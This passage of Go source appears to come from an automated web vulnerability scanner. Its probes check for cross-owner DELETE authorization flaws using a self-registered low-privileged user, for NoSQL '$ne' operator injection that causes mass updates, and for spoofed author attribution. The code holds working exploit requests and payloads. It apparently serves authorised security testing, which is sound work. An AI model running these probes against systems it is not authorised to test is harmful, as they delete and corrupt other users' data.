			"This is an authorization failure on a business object, not a payload-specific issue.",
		Remediation: "Require server-side role authorization for shared catalog/listing writes. Treat public catalog APIs as read-only, derive mutable fields from privileged back-office workflows, and add regression tests proving anonymous and ordinary users cannot update shared entities.",
		Evidence:    evidence,
	})
}

// probeLowPrivilegeCollectionDeletes checks one destructive but high-signal
// access-control invariant: can a freshly-created low-privileged user delete a
// content/moderation item owned by someone else? The probe is deliberately
// gated to full_control authority because DELETE changes target state.
func (v *VerifierAgent) probeLowPrivilegeCollectionDeletes(ctx context.Context, target string) {
	entries, err := v.db.GetTrafficByScan(v.scanID)
	if err != nil {
		return
	}
	candidates := lowPrivilegeDeleteCandidatesFromTraffic(entries, target)
	if len(candidates) == 0 {
		return
	}
	if v.authority != policy.AuthorityFullControl {
		v.db.InsertNarration(v.scanID, "verifier", "skipped",
			fmt.Sprintf("Found %d cross-owner content delete candidate(s), but skipped destructive BAC probe because testing authority is %q.",
				len(candidates), firstNonBlank(string(v.authority), string(policy.AuthorityActive))),
			target, map[string]any{"required_authority": policy.AuthorityFullControl})
		return
	}

	persona, ok := v.ensureSyntheticLowPrivilegePersona(ctx, target, entries)
	if !ok || len(persona.Headers) == 0 || persona.UserID <= 0 {
		v.db.InsertNarration(v.scanID, "verifier", "dismissed",
			"Could not create/login a synthetic low-privileged user for cross-owner delete authorization testing.",
			target, nil)
		return
	}

	v.db.InsertNarration(v.scanID, "verifier", "attempt",
		fmt.Sprintf("Testing whether synthetic low-privileged user %s can delete %d observed content/moderation item(s) owned by other actors.",
			persona.Email, len(candidates)),
		target, map[string]any{"persona_user_id": persona.UserID, "persona_source": persona.Source})

	const maxAttempts = 3
	attempts := 0
	for _, candidate := range candidates {
		if ctx.Err() != nil || attempts >= maxAttempts {
			return
		}
		if candidate.OwnerID <= 0 || candidate.OwnerID == persona.UserID {
			continue
		}
		attempts++
		status, respBody, ok := v.sendDeleteWithHeaders(ctx, candidate.URL, persona.Headers,
			"AOBTD/Verifier (low-privilege delete BAC probe)")
		v.tested++
		if !ok {
			v.dismissed++
			continue
		}
		if status < 200 || status >= 300 {
			v.dismissed++
			v.db.InsertNarration(v.scanID, "verifier", "dismissed",
				fmt.Sprintf("Low-privileged delete of %s was rejected with status %d.", candidate.Path, status),
				candidate.URL, map[string]any{
					"persona_user_id": persona.UserID,
					"owner_field":     candidate.OwnerField,
					"owner_id":        candidate.OwnerID,
					"response_body":   truncateString(respBody, 240),
				})
			continue
		}
		v.confirmed++
		v.storeLowPrivilegeDeleteFinding(candidate, persona, status, respBody)
		v.db.InsertNarration(v.scanID, "verifier", "confirmed",
			fmt.Sprintf("Low-privileged user %s deleted cross-owner %s %d owned by %s=%d.",
				persona.Email, candidate.ObjectLabel, candidate.ItemID, candidate.OwnerField, candidate.OwnerID),
			candidate.URL, map[string]any{
				"persona_user_id": persona.UserID,
				"owner_field":     candidate.OwnerField,
				"owner_id":        candidate.OwnerID,
				"status":          status,
			})
		return
	}
}

func lowPrivilegeDeleteCandidatesFromTraffic(entries []types.TrafficEntry, target string) []lowPrivilegeDeleteCandidate {
	origin := originFromURL(target)
	if origin == "" {
		for _, entry := range entries {
			origin = originFromURL(entry.Request.URL)
			if origin != "" {
				break
			}
		}
	}
	if origin == "" {
		return nil
	}
	origin = strings.TrimRight(origin, "/")

	seen := make(map[string]bool)
	var out []lowPrivilegeDeleteCandidate
	for _, entry := range entries {
		if strings.ToUpper(entry.Request.Method) != "GET" ||
			entry.Response.StatusCode < 200 || entry.Response.StatusCode >= 300 ||
			len(entry.Response.Body) == 0 ||
			!lowPrivilegeDeletePathLooksModeratedContent(entry.Request.Path+" "+entry.Request.URL) {
			continue
		}
		objects := jsonObjectArrayFromEnvelope(entry.Response.Body)
		if len(objects) == 0 {
			continue
		}
		path := entry.Request.Path
		if path == "" {
			if parsed, err := url.Parse(entry.Request.URL); err == nil {
				path = parsed.Path
			}
		}
		if path == "" {
			continue
		}
		baseURL := entry.Request.URL
		if originFromURL(baseURL) == "" {
			if !strings.HasPrefix(path, "/") {
				path = "/" + path
			}
			baseURL = origin + path
		}
		baseURL = strings.Split(baseURL, "?")[0]
		baseURL = strings.TrimRight(baseURL, "/")
		for _, obj := range objects {
			id, ok := jsonObjectPositiveInt(obj, "id", "ID")
			if !ok {
				continue
			}
			ownerField, ownerID, ok := jsonObjectOwnerID(obj)
			if !ok {
				continue
			}
			deleteURL := fmt.Sprintf("%s/%d", baseURL, id)
			key := deleteURL + "|" + ownerField
			if seen[key] {
				continue
			}
			seen[key] = true
			bodyBytes, _ := json.Marshal(obj)
			candidate := lowPrivilegeDeleteCandidate{
				URL:         deleteURL,
				Path:        strings.TrimRight(path, "/") + fmt.Sprintf("/%d", id),
				ItemID:      id,
				OwnerField:  ownerField,
				OwnerID:     ownerID,
				ObjectLabel: lowPrivilegeDeleteObjectLabel(path),
				Source:      "observed JSON content/moderation collection with owner-marked items",
				BodyPreview: truncateString(string(bodyBytes), 400),
				Priority:    lowPrivilegeDeletePriority(path, obj),
			}
			out = append(out, candidate)
		}
	}
	sort.SliceStable(out, func(i, j int) bool {
		if out[i].Priority != out[j].Priority {
			return out[i].Priority > out[j].Priority
		}
		if out[i].OwnerID != out[j].OwnerID {
			return out[i].OwnerID < out[j].OwnerID
		}
		return out[i].ItemID < out[j].ItemID
	})
	if len(out) > 8 {
		return out[:8]
	}
	return out
}

func lowPrivilegeDeletePathLooksModeratedContent(text string) bool {
	lower := strings.ToLower(text)
	for _, blocked := range []string{
		"product", "catalog", "quantity", "price", "image", "asset", "language",
		"challenge", "score", "hint", "securityquestion", "captcha", "metrics",
	} {
		if strings.Contains(lower, blocked) {
			return false
		}
	}
	for _, term := range []string{
		"feedback", "review", "comment", "message", "moderation", "complaint", "report",
	} {
		if strings.Contains(lower, term) {
			return true
		}
	}
	return false
}

func lowPrivilegeDeleteObjectLabel(path string) string {
	lower := strings.ToLower(path)
	switch {
	case strings.Contains(lower, "feedback"):
		return "feedback"
	case strings.Contains(lower, "review"):
		return "review"
	case strings.Contains(lower, "comment"):
		return "comment"
	case strings.Contains(lower, "message"):
		return "message"
	case strings.Contains(lower, "complaint"):
		return "complaint"
	default:
		return "content item"
	}
}

func lowPrivilegeDeletePriority(path string, obj map[string]any) int {
	score := 0
	lower := strings.ToLower(path)
	if strings.Contains(lower, "feedback") || strings.Contains(lower, "review") {
		score += 5
	}
	if n, ok := jsonObjectPositiveInt(obj, "rating", "stars", "score"); ok && n >= 5 {
		score += 4
	}
	for key := range obj {
		compact := strings.ToLower(strings.ReplaceAll(strings.ReplaceAll(key, "_", ""), "-", ""))
		switch compact {
		case "comment", "message", "review", "feedback", "content", "caption":
			score += 2
		}
	}
	return score
}

func jsonObjectArrayFromEnvelope(body []byte) []map[string]any {
	var decoded any
	if err := json.Unmarshal(body, &decoded); err != nil {
		return nil
	}
	switch typed := decoded.(type) {
	case []any:
		return mapsFromJSONArray(typed)
	case map[string]any:
		for _, key := range []string{"data", "items", "results", "records", "rows"} {
			if arr, ok := typed[key].([]any); ok {
				return mapsFromJSONArray(arr)
			}
		}
	}
	return nil
}

func mapsFromJSONArray(items []any) []map[string]any {
	var out []map[string]any
	for _, item := range items {
		if obj, ok := item.(map[string]any); ok {
			out = append(out, obj)
		}
	}
	return out
}

func jsonObjectPositiveInt(obj map[string]any, keys ...string) (int64, bool) {
	for _, want := range keys {
		for key, value := range obj {
			if !strings.EqualFold(key, want) {
				continue
			}
			if n, ok := integerLikeValue(value); ok && n > 0 {
				return n, true
			}
			if s, ok := value.(string); ok {
				if n, ok := parseSmallInt64(strings.TrimSpace(s)); ok && n > 0 {
					return n, true
				}
			}
		}
	}
	return 0, false
}

func jsonObjectOwnerID(obj map[string]any) (string, int64, bool) {
	for _, want := range []string{
		"UserId", "userId", "user_id", "ownerId", "owner_id",
		"authorId", "author_id", "createdBy", "created_by", "accountId", "account_id",
	} {
		for key, value := range obj {
			if !strings.EqualFold(key, want) {
				continue
			}
			if n, ok := integerLikeValue(value); ok && n > 0 {
				return key, n, true
			}
			if s, ok := value.(string); ok {
				if n, ok := parseSmallInt64(strings.TrimSpace(s)); ok && n > 0 {
					return key, n, true
				}
			}
		}
	}
	return "", 0, false
}

func (v *VerifierAgent) ensureSyntheticLowPrivilegePersona(ctx context.Context, target string, entries []types.TrafficEntry) (syntheticAuthPersona, bool) {
	origin := strings.TrimRight(originFromURL(target), "/")
	if origin == "" {
		origin = strings.TrimRight(target, "/")
	}
	stamp := time.Now().UnixNano()
	email := fmt.Sprintf("aobtd-lowpriv-%d@example.invalid", stamp)
	password := fmt.Sprintf("A0btd-LowPriv-%d!", stamp%1000000)

	securityQuestion, _ := v.securityQuestionForSyntheticRegistration(ctx, origin, entries)
	registerBodies := syntheticRegistrationBodies(email, password, securityQuestion)
	registerPaths := []string{"/api/Users", "/api/users", "/api/register", "/register", "/signup", "/api/auth/register"}
	var userID int64
	for _, path := range registerPaths {
		if ctx.Err() != nil {
			return syntheticAuthPersona{}, false
		}
		for _, body := range registerBodies {
			bodyBytes, _ := json.Marshal(body)
			status, respBody, ok := v.sendJSONWithHeaders(ctx, "POST", origin+path, bodyBytes, nil,
				"AOBTD/Verifier (synthetic low-priv registration)")
			v.tested++
			if !ok || status < 200 || status >= 300 {
				if ok {
					v.dismissed++
				}
				continue
			}
			if id, ok := jsonNestedInt64(respBody, "id"); ok && id > 0 {
				userID = id
			}
			headers, loginSource, loginOK := v.loginSyntheticUser(ctx, origin, email, password)
			if !loginOK || len(headers) == 0 {
				v.dismissed++
				continue
			}
			if userID <= 0 {
				if id, ok := v.syntheticWhoamiUserID(ctx, origin, headers); ok {
					userID = id
				}
			}
			if userID <= 0 {
				v.dismissed++
				continue
			}
			return syntheticAuthPersona{
				Email:   email,
				UserID:  userID,
				Headers: headers,
				Source:  fmt.Sprintf("created via %s, logged in via %s", path, loginSource),
			}, true
		}
	}
	return syntheticAuthPersona{}, false
}

func syntheticRegistrationBodies(email, password string, securityQuestion map[string]any) []map[string]any {
	base := []map[string]any{
		{
			"email":          email,
			"password":       password,
			"passwordRepeat": password,
		},
		{
			"email":           email,
			"password":        password,
			"confirmPassword": password,
		},
		{
			"username": email,
			"email":    email,
			"password": password,
		},
	}
	if len(securityQuestion) == 0 {
		return base
	}
	var withQuestion []map[string]any
	for _, body := range base {
		clone := cloneJSONMap(body)
		clone["securityQuestion"] = securityQuestion
		clone["securityAnswer"] = "aobtd"
		withQuestion = append(withQuestion, clone)
	}
	return append(withQuestion, base...)
}

func (v *VerifierAgent) securityQuestionForSyntheticRegistration(ctx context.Context, origin string, entries []types.TrafficEntry) (map[string]any, bool) {
	if q, ok := securityQuestionFromTraffic(entries); ok {
		return q, true
	}
	for _, path := range []string{"/api/SecurityQuestions/", "/api/security-questions", "/api/securityQuestions"} {
		if ctx.Err() != nil {
			return nil, false
		}
		resp, body, _, err := v.proactiveGET(ctx, origin+path)
		v.tested++
		if err != nil || resp == nil || resp.StatusCode < 200 || resp.StatusCode >= 300 {
			if err == nil {
				v.dismissed++
			}
			continue
		}
		entries := []types.TrafficEntry{{
			Request:  types.CapturedRequest{Method: "GET", URL: origin + path, Path: path},
			Response: types.CapturedResponse{StatusCode: resp.StatusCode, Body: []byte(body), ContentType: resp.Header.Get("Content-Type")},
		}}
		if q, ok := securityQuestionFromTraffic(entries); ok {
			return q, true
		}
	}
	return nil, false
}

func securityQuestionFromTraffic(entries []types.TrafficEntry) (map[string]any, bool) {
	for _, entry := range entries {
		if entry.Response.StatusCode < 200 || entry.Response.StatusCode >= 300 || len(entry.Response.Body) == 0 {
			continue
		}
		text := strings.ToLower(entry.Request.Path + " " + entry.Request.URL)
		if !strings.Contains(text, "security") || !strings.Contains(text, "question") {
			continue
		}
		for _, obj := range jsonObjectArrayFromEnvelope(entry.Response.Body) {
			id, ok := jsonObjectPositiveInt(obj, "id", "ID")
			if !ok {
				continue
			}
			question := ""
			for key, value := range obj {
				if strings.EqualFold(key, "question") {
					question = strings.TrimSpace(fmt.Sprint(value))
					break
				}
			}
			if question == "" {
				continue
			}
			return map[string]any{"id": id, "question": question}, true
		}
	}
	return nil, false
}

func (v *VerifierAgent) loginSyntheticUser(ctx context.Context, origin, email, password string) (map[string]string, string, bool) {
	for _, path := range []string{"/rest/user/login", "/api/auth/login", "/api/login", "/login", "/signin", "/authenticate"} {
		if ctx.Err() != nil {
			return nil, "", false
		}
		for _, body := range []map[string]any{
			{"email": email, "password": password},
			{"username": email, "password": password},
		} {
			bodyBytes, _ := json.Marshal(body)
			status, respBody, ok := v.sendJSONWithHeaders(ctx, "POST", origin+path, bodyBytes, nil,
				"AOBTD/Verifier (synthetic low-priv login)")
			v.tested++
			if !ok || status != http.StatusOK {
				if ok {
					v.dismissed++
				}
				continue
			}
			token := extractAuthTokenFromJSON([]byte(respBody))
			if token == "" {
				v.dismissed++
				continue
			}
			return map[string]string{"Authorization": "Bearer " + token}, path, true
		}
	}
	return nil, "", false
}

func (v *VerifierAgent) syntheticWhoamiUserID(ctx context.Context, origin string, headers map[string]string) (int64, bool) {
	for _, path := range []string{"/rest/user/whoami", "/api/me", "/api/user/me", "/api/profile"} {
		if ctx.Err() != nil {
			return 0, false
		}
		resp, body, _, err := v.proactiveGETWithHeaders(ctx, origin+path, headers,
			"AOBTD/Verifier (synthetic low-priv whoami)")
		v.tested++
		if err != nil || resp == nil || resp.StatusCode < 200 || resp.StatusCode >= 300 {
			if err == nil {
				v.dismissed++
			}
			continue
		}
		for _, key := range []string{"id", "UserId", "userId", "user_id"} {
			if id, ok := jsonNestedInt64(body, key); ok && id > 0 {
				return id, true
			}
		}
	}
	return 0, false
}

func (v *VerifierAgent) sendDeleteWithHeaders(ctx context.Context, rawURL string, headers map[string]string, userAgent string) (int, string, bool) {
	req, err := http.NewRequestWithContext(ctx, http.MethodDelete, rawURL, nil)
	if err != nil {
		return 0, "", false
	}
	if userAgent == "" {
		userAgent = "AOBTD/Verifier"
	}
	req.Header.Set("User-Agent", userAgent)
	for k, val := range headers {
		lower := strings.ToLower(k)
		if lower == "host" || lower == "content-length" {
			continue
		}
		req.Header.Set(k, val)
	}
	resp, err := v.client.Do(req)
	if err != nil || resp == nil {
		return 0, "", false
	}
	respBody, _ := io.ReadAll(io.LimitReader(resp.Body, 512*1024))
	resp.Body.Close()
	return resp.StatusCode, string(respBody), true
}

func (v *VerifierAgent) storeLowPrivilegeDeleteFinding(candidate lowPrivilegeDeleteCandidate, persona syntheticAuthPersona, status int, respBody string) {
	path := candidate.Path
	if path == "" {
		path = candidate.URL
	}
	title := fmt.Sprintf("Low-privileged user can delete cross-owner %s at %s", candidate.ObjectLabel, path)
	description := fmt.Sprintf(
		"A freshly-created low-privileged user (%s, id=%d) could DELETE %s even though the observed object was owned by %s=%d. Source: %s.",
		persona.Email, persona.UserID, path, candidate.OwnerField, candidate.OwnerID, candidate.Source)
	evidence := fmt.Sprintf(
		"Delete URL: %s\nSynthetic user: %s (id=%d)\nObserved owner: %s=%d\nStatus: %d\nOriginal object preview: %s\nResponse preview: %s",
		candidate.URL, persona.Email, persona.UserID, candidate.OwnerField, candidate.OwnerID, status,
		candidate.BodyPreview, truncateString(respBody, 700))
	profile := types.PageProfile{ID: "DELETE " + path, URL: candidate.URL, Method: http.MethodDelete}
	v.storeFinding(profile, types.Finding{
		Title:       title,
		Description: description,
		Severity:    types.SeverityHigh,
		Confidence:  types.ConfidenceConfirmed,
		EndpointID:  "DELETE " + path,
		VulnType:    "broken_access_control_delete",
		ParamName:   "id",
		Payload:     fmt.Sprintf("%d", candidate.ItemID),
		PocRequest: fmt.Sprintf(
			"DELETE %s HTTP/1.1\nHost: <target>\nAuthorization: Bearer <low-privileged synthetic user token>",
			path),
		PocResponse: fmt.Sprintf("HTTP/1.1 %d\n\n%s", status, truncateString(respBody, 800)),
		StepsToReproduce: fmt.Sprintf(
			"1. Create or use a low-privileged user account.\n"+
				"2. Observe %s in a content/moderation collection; it is owned by %s=%d.\n"+
				"3. Send DELETE %s as the low-privileged user.\n"+
				"4. The server returns %d and deletes the cross-owner object.",
			path, candidate.OwnerField, candidate.OwnerID, path, status),
		Impact: "A low-privileged account can remove content owned by another user or managed by a moderation/admin workflow. " +
			"This breaks object-level authorization and can be used for censorship, evidence deletion, support workflow abuse, or destructive account actions.",
		Remediation: "Authorize destructive object actions server-side by checking both role and object ownership before deletion. " +
			"Do not rely on hidden UI controls; enforce admin/moderator permissions and owner checks in the API handler.",
		Evidence: evidence,
	})
}

type noSQLOperatorMutationCandidate struct {
	URL      string
	Path     string
	Method   string
	Source   string
	IDField  string
	MsgField string
}

type noSQLOperatorMutationResult struct {
	Status         int
	Body           string
	Modified       int64
	OriginalCount  int
	UpdatedCount   int
	AcceptanceText string
}

func (v *VerifierAgent) probeNoSQLOperatorMutation(ctx context.Context, target string) {
	entries, err := v.db.GetTrafficByScan(v.scanID)
	if err != nil {
		return
	}
	candidates := noSQLOperatorMutationCandidatesFromTraffic(entries, target)
	if len(candidates) == 0 {
		return
	}
	if v.authority != policy.AuthorityFullControl {
		v.db.InsertNarration(v.scanID, "verifier", "skipped",
			fmt.Sprintf("Found %d NoSQL-style mutation candidate(s), but skipped operator-injection write probe because testing authority is %q.",
				len(candidates), firstNonBlank(string(v.authority), string(policy.AuthorityActive))),
			target, map[string]any{"required_authority": policy.AuthorityFullControl})
		return
	}

	persona, ok := v.ensureSyntheticLowPrivilegePersona(ctx, target, entries)
	if !ok || len(persona.Headers) == 0 {
		v.db.InsertNarration(v.scanID, "verifier", "dismissed",
			"Could not create/login a synthetic low-privileged user for NoSQL operator mutation testing.",
			target, nil)
		return
	}

	v.db.InsertNarration(v.scanID, "verifier", "attempt",
		fmt.Sprintf("Testing %d inferred JSON mutation endpoint(s) for Mongo-style operator selector injection with a synthetic low-privileged user.",
			len(candidates)),
		target, map[string]any{"persona_user_id": persona.UserID, "persona_source": persona.Source})

	const maxAttempts = 3
	attempts := 0
	for _, candidate := range candidates {
		if ctx.Err() != nil || attempts >= maxAttempts {
			return
		}
		attempts++
		marker := fmt.Sprintf("aobtd-nosql-%d", time.Now().UnixNano())
		baselineBody := map[string]any{
			candidate.IDField:  "000000000000000000000000",
			candidate.MsgField: marker + "-baseline",
		}
		baselineBytes, _ := json.Marshal(baselineBody)
		baselineStatus, baselineResp, baselineOK := v.sendJSONWithHeaders(ctx, candidate.Method, candidate.URL, baselineBytes, persona.Headers,
			"AOBTD/Verifier (NoSQL operator baseline)")
		v.tested++
		if !baselineOK {
			v.dismissed++
			continue
		}
		if baselineStatus < 200 || baselineStatus >= 300 {
			v.dismissed++
			continue
		}
		if modified, _, _ := noSQLOperatorMutationSignal(baselineResp, marker+"-baseline"); modified > 0 {
			v.dismissed++
			v.db.InsertNarration(v.scanID, "verifier", "dismissed",
				fmt.Sprintf("NoSQL operator probe baseline unexpectedly modified %d object(s); skipping %s to avoid ambiguous evidence.",
					modified, candidate.Path),
				candidate.URL, nil)
			continue
		}

		operatorBody := map[string]any{
			candidate.IDField:  map[string]any{"$ne": nil},
			candidate.MsgField: marker,
		}
		operatorBytes, _ := json.Marshal(operatorBody)
		status, respBody, ok := v.sendJSONWithHeaders(ctx, candidate.Method, candidate.URL, operatorBytes, persona.Headers,
			"AOBTD/Verifier (NoSQL operator mutation)")
		v.tested++
		if !ok || status < 200 || status >= 300 {
			v.dismissed++
			continue
		}
		modified, originalCount, updatedCount := noSQLOperatorMutationSignal(respBody, marker)
		if modified < 2 && originalCount < 2 && updatedCount < 2 {
			v.dismissed++
			continue
		}
		v.confirmed++
		result := noSQLOperatorMutationResult{
			Status:         status,
			Body:           respBody,
			Modified:       modified,
			OriginalCount:  originalCount,
			UpdatedCount:   updatedCount,
			AcceptanceText: fmt.Sprintf("modified=%d original=%d updated=%d", modified, originalCount, updatedCount),
		}
		v.storeNoSQLOperatorMutationFinding(candidate, persona, baselineBody, operatorBody, baselineResp, result)
		v.db.InsertNarration(v.scanID, "verifier", "confirmed",
			fmt.Sprintf("%s accepted a Mongo-style operator selector and updated multiple objects (%s).",
				candidate.Path, result.AcceptanceText),
			candidate.URL, map[string]any{
				"persona_user_id": persona.UserID,
				"source":          candidate.Source,
				"signal":          result.AcceptanceText,
			})
		return
	}
}

func noSQLOperatorMutationCandidatesFromTraffic(entries []types.TrafficEntry, target string) []noSQLOperatorMutationCandidate {
	origin := originFromURL(target)
	if origin == "" {
		for _, entry := range entries {
			origin = originFromURL(entry.Request.URL)
			if origin != "" {
				break
			}
		}
	}
	if origin == "" {
		return nil
	}
	origin = strings.TrimRight(origin, "/")
	seen := make(map[string]bool)
	var out []noSQLOperatorMutationCandidate
	add := func(method, path, source string) {
		if path == "" {
			return
		}
		if !strings.HasPrefix(path, "/") {
			path = "/" + path
		}
		if method == "" {
			method = http.MethodPatch
		}
		key := method + " " + path
		if seen[key] {
			return
		}
		seen[key] = true
		out = append(out, noSQLOperatorMutationCandidate{
			URL:      origin + path,
			Path:     path,
			Method:   method,
			Source:   source,
			IDField:  "id",
			MsgField: "message",
		})
	}

	for _, entry := range entries {
		pathText := strings.ToLower(entry.Request.Path + " " + entry.Request.URL)
		if strings.Contains(pathText, "/reviews") && strings.Contains(pathText, "/products/") {
			add(http.MethodPatch, "/rest/products/reviews", "observed product review read endpoint")
		}
		if entry.Response.StatusCode < 200 || entry.Response.StatusCode >= 400 ||
			len(entry.Response.Body) == 0 || len(entry.Response.Body) > 2_000_000 ||
			!clientCredentialArtifactCandidate(entry) {
			continue
		}
		text := string(entry.Response.Body)
		lower := strings.ToLower(text)
		if strings.Contains(lower, "/rest/products") &&
			strings.Contains(lower, "/reviews") &&
			(strings.Contains(lower, ".patch(") || strings.Contains(lower, "patch(") || strings.Contains(lower, ".put(")) &&
			strings.Contains(lower, "message") &&
			strings.Contains(lower, "id") {
			add(http.MethodPatch, "/rest/products/reviews", "same-origin client artifact exposed product review patch service")
		}
		for _, path := range noSQLReviewMutationPathsFromText(text) {
			add(http.MethodPatch, path, "same-origin client artifact exposed review mutation path")
		}
		if len(out) >= 4 {
			return out
		}
	}
	return out
}

var noSQLReviewPathRE = regexp.MustCompile(`(?i)/(?:api|rest)/[A-Za-z0-9_./{}$:-]*reviews?`)

func noSQLReviewMutationPathsFromText(text string) []string {
	if strings.TrimSpace(text) == "" {
		return nil
	}
	seen := make(map[string]bool)
	var out []string
	for _, match := range noSQLReviewPathRE.FindAllString(text, 16) {
		path := strings.Trim(match, `"'`+"` ;,)")
		if strings.Contains(path, "${") || strings.Contains(path, "{") || strings.Contains(path, "}") {
			continue
		}
		lower := strings.ToLower(path)
		if !strings.Contains(lower, "review") {
			continue
		}
		if strings.Contains(lower, "/products/") && strings.HasSuffix(strings.TrimRight(lower, "/"), "/reviews") {
			path = "/rest/products/reviews"
		}
		if seen[path] {
			continue
		}
		seen[path] = true
		out = append(out, path)
	}
	return out
}

func noSQLOperatorMutationSignal(body, marker string) (modified int64, originalCount int, updatedCount int) {
	var decoded any
	if err := json.Unmarshal([]byte(body), &decoded); err != nil {
		return 0, 0, 0
	}
	if n, ok := nestedInt64(decoded, "modified"); ok {
		modified = n
	}
	if arr, ok := nestedArray(decoded, "original"); ok {
		originalCount = len(arr)
	}
	if arr, ok := nestedArray(decoded, "updated"); ok {
		updatedCount = len(arr)
	}
	if marker != "" && !strings.Contains(body, marker) && modified == 0 && updatedCount == 0 {
		return 0, originalCount, updatedCount
	}
	return modified, originalCount, updatedCount
}

func nestedArray(value any, key string) ([]any, bool) {
	switch typed := value.(type) {
	case map[string]any:
		for k, item := range typed {
			if strings.EqualFold(k, key) {
				if arr, ok := item.([]any); ok {
					return arr, true
				}
			}
		}
		for _, item := range typed {
			if arr, ok := nestedArray(item, key); ok {
				return arr, true
			}
		}
	case []any:
		for _, item := range typed {
			if arr, ok := nestedArray(item, key); ok {
				return arr, true
			}
		}
	}
	return nil, false
}

func (v *VerifierAgent) storeNoSQLOperatorMutationFinding(candidate noSQLOperatorMutationCandidate, persona syntheticAuthPersona, baselineBody, operatorBody map[string]any, baselineResp string, result noSQLOperatorMutationResult) {
	baselineBytes, _ := json.Marshal(baselineBody)
	operatorBytes, _ := json.Marshal(operatorBody)
	title := fmt.Sprintf("NoSQL operator injection causes mass update at %s", candidate.Path)
	description := fmt.Sprintf(
		"%s accepted a JSON selector object in field %q from a low-privileged user and updated multiple records. Baseline impossible-id update modified zero records, while the operator selector returned %s. Source: %s.",
		candidate.Path, candidate.IDField, result.AcceptanceText, candidate.Source)
	evidence := fmt.Sprintf(
		"URL: %s\nSynthetic user: %s (id=%d)\nBaseline body: %s\nBaseline response: %s\nOperator body: %s\nStatus: %d\nSignal: %s\nResponse preview: %s",
		candidate.URL, persona.Email, persona.UserID, string(baselineBytes), truncateString(baselineResp, 400),
		string(operatorBytes), result.Status, result.AcceptanceText, truncateString(result.Body, 900))
	profile := types.PageProfile{ID: candidate.Method + " " + candidate.Path, URL: candidate.URL, Method: candidate.Method}
	v.storeFinding(profile, types.Finding{
		Title:       title,
		Description: description,
		Severity:    types.SeverityCritical,
		Confidence:  types.ConfidenceConfirmed,
		EndpointID:  candidate.Method + " " + candidate.Path,
		VulnType:    "nosql_operator_injection",
		ParamName:   candidate.IDField,
		Payload:     string(operatorBytes),
		PocRequest: fmt.Sprintf(
			"%s %s HTTP/1.1\nHost: <target>\nAuthorization: Bearer <low-privileged synthetic user token>\nContent-Type: application/json\n\n%s",
			candidate.Method, candidate.Path, string(operatorBytes)),
		PocResponse: fmt.Sprintf("HTTP/1.1 %d\n\n%s", result.Status, truncateString(result.Body, 1000)),
		StepsToReproduce: fmt.Sprintf(
			"1. As a low-privileged user, send baseline %s %s with body %s and observe no records are modified.\n"+
				"2. Send %s %s with body %s.\n"+
				"3. Observe the server updates multiple records (%s), proving the id field is interpreted as a NoSQL selector object.",
			candidate.Method, candidate.Path, string(baselineBytes), candidate.Method, candidate.Path, string(operatorBytes), result.AcceptanceText),
		Impact: "Attackers can replace scalar identifiers with NoSQL operators such as `$ne` to widen an update from one owned object to many objects. " +
			"This can corrupt user content, bypass ownership checks, and become a mass-assignment primitive across a collection.",
		Remediation: "Validate request schemas strictly before database access. Identifier fields must be scalar strings/integers, not objects or arrays. " +
			"Use parameterized query builders or explicit equality filters, reject `$`-prefixed keys from untrusted JSON, and add regression tests for operator objects.",
		Evidence: evidence,
	})
}

type clientControlledAttributionCandidate struct {
	URL              string
	Path             string
	Method           string
	ReadURL          string
	ReadPath         string
	AttributionField string
	MessageField     string
	ContainerLabel   string
	Source           string
}

type clientControlledAttributionResult struct {
	Status     int
	Body       string
	ReadStatus int
	ReadBody   string
	AuthSource string
	Signal     string
}

// probeClientControlledAttribution checks whether a content/review create API
// trusts client-supplied attribution such as "author", "createdBy", or
// "ownerEmail". The proof is intentionally read-back based: a 2xx write is not
// enough; the unique marker must later appear in the collection with the
// spoofed identity in the same JSON object. It is active-safe because it only
// creates bounded marker content and avoids destructive follow-up actions.
func (v *VerifierAgent) probeClientControlledAttribution(ctx context.Context, target string) {
	entries, err := v.db.GetTrafficByScan(v.scanID)
	if err != nil {
		return
	}
	candidates := clientControlledAttributionCandidatesFromTraffic(entries, target)
	if len(candidates) == 0 {
		return
	}
	if !clientControlledAttributionAuthority(v.authority) {
		v.db.InsertNarration(v.scanID, "verifier", "skipped",
			fmt.Sprintf("Found %d client-controlled attribution candidate(s), but skipped content-write proof because testing authority is %q.",
				len(candidates), firstNonBlank(string(v.authority), string(policy.AuthorityActive))),
			target, map[string]any{"required_authority": policy.AuthorityActive})
		return
	}

	persona, personaOK := v.ensureSyntheticLowPrivilegePersona(ctx, target, entries)
	identities := clientControlledAttributionIdentities(entries, persona.Email, target, 6)
	if len(identities) == 0 {
		v.db.InsertNarration(v.scanID, "verifier", "dismissed",
			"Could not choose a spoofed author/owner identity for client-controlled attribution testing.",
			target, nil)
		return
	}

	v.db.InsertNarration(v.scanID, "verifier", "attempt",
		fmt.Sprintf("Testing %d inferred content/review create endpoint(s) for client-controlled author/owner attribution.",
			len(candidates)),
		target, map[string]any{
			"persona_user_id": persona.UserID,
			"persona_source":  persona.Source,
			"spoof_identity":  identities[0],
		})

	type authAttempt struct {
		headers map[string]string
		source  string
	}
	authAttempts := []authAttempt{{source: "unauthenticated request"}}
	if personaOK && len(persona.Headers) > 0 {
		authAttempts = append(authAttempts, authAttempt{headers: persona.Headers, source: "synthetic low-privileged user " + persona.Email})
	}

	const maxCandidates = 3
	const maxIdentities = 3
	attempts := 0
	for _, candidate := range candidates {
		if ctx.Err() != nil || attempts >= maxCandidates {
			return
		}
		identityLimit := len(identities)
		if identityLimit > maxIdentities {
			identityLimit = maxIdentities
		}
		for _, spoofIdentity := range identities[:identityLimit] {
			if ctx.Err() != nil {
				return
			}
			if personaOK && strings.EqualFold(spoofIdentity, persona.Email) {
				continue
			}
			attempts++
			marker := fmt.Sprintf("aobtd-attrib-%d", time.Now().UnixNano())
			body := map[string]any{
				candidate.MessageField:     marker,
				candidate.AttributionField: spoofIdentity,
			}
			bodyBytes, _ := json.Marshal(body)

			for _, auth := range authAttempts {
				status, respBody, ok := v.sendJSONWithHeaders(ctx, candidate.Method, candidate.URL, bodyBytes, auth.headers,
					"AOBTD/Verifier (client-controlled attribution probe)")
				v.tested++
				if !ok || status < 200 || status >= 300 {
					if ok {
						v.dismissed++
					}
					continue
				}

				readResp, readBody, _, err := v.proactiveGETWithHeaders(ctx, candidate.ReadURL, auth.headers,
					"AOBTD/Verifier (client-controlled attribution read-back)")
				v.tested++
				if err != nil || readResp == nil || readResp.StatusCode < 200 || readResp.StatusCode >= 300 {
					if err == nil {
						v.dismissed++
					}
					continue
				}
